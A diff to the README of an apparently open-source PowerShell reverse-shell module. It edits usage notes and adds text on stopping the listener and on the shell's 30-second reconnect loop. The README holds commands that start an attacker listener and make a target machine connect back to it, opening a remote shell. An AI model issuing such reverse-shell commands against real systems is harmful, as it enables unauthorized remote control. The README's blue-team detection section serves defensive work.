@@ -4,7 +4,7 @@ to connect to Start-Listener as well as netcat and metasploit modules however it
 I will add a tool for that in the future. This is a PowerShell module meaning it only contains functions/cmdlets to be imported into a PowerShell session. If you wish to execute one of the commands whenever the file is run just add the command you wish to execute to the bottom of the file.
 
 #### BLUE TEAM DISCOVERY
-Find-ReverseShell.psm1 can be used to search the Windows Event Log for when a Reverse Shell is created that uses a System.Net.Sockets.TcpListener object. This will discover any reverse shell that creates a TcpListener object and not just the below module. This method does not catch PowerCat.ps1 which I am still looking for a good way to discover. This part is still a work in progress.
+Find-ReverseShell.ps1 can be used to search the Windows Event Log for when a Reverse Shell is created that uses a System.Net.Sockets.TcpListener object. This will discover any reverse shell that creates a TcpListener object and not just the below module. This method does not catch PowerCat.ps1 which I am still looking for a good way to discover. This part is still a work in progress.
 
 #### WAYS TO INSTALL OR IMPORT THE MODULE
 This is not a requirement. It just a way of saving the module to your device if you wish to keep it around for use at later times.
@@ -64,6 +64,7 @@ Start-Bind -Port 8088
 #### START LISTENER
 The below command can be executed to start a listener on the Attack machine on port 8089. This can be
 connected too using Invoke-ReversePowerShell as well as ncat, netcat, metasploit, and other tools.
+The listener can be stopped or canceld by doing Ctrl + C.
 ```powershell
 Start-Listener -Port 8089
 ```
@@ -71,6 +72,8 @@ Start-Listener -Port 8089
 #### ISSUE REVERSE SHELL CONNECTION
 The below command is to be issued on the Target Machine to connect to the listener over
 port 8089. This will not be able to complete a connection to the Start-Bind cmdlet.
+If a connection failes a loop will be started that begins a 30 second visual countdown timer.
+After 30 seconds the connection will attempt to re-establish the shell.
 ```powershell
 Invoke-ReversePowerShell -IpAddress 192.168.0.10 -Port 8089
 ```
